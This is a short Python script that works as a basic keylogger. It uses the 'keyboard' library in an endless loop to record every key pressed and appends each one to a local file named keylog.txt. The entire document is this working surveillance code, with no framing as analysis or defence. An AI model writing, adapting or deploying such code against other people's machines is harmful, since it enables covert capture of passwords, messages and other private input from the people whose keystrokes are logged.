import keyboard as kb

while True:
	keyEvent = kb.read_key()
	with open('keylog.txt', 'a') as f:
		f.write(str(keyEvent))